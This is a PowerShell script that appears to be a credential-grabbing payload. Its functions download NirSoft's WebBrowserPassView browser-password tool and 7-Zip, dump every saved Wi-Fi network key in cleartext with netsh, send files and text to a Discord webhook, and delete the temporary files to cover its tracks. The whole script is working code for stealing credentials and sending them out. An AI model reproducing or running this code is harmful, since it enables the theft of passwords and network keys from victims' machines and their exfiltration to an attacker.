function Get-Nirsoft {

  mkdir \temp 
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'YOUR-DISCORD-WEBHOOK'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

function Create-Wifi-File {

$desktop = ([Environment]::GetFolderPath("Desktop"))  
New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt

}

function Del-Wifi-File {

Set-Location -Path "$env:temp"
Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
exit
 }




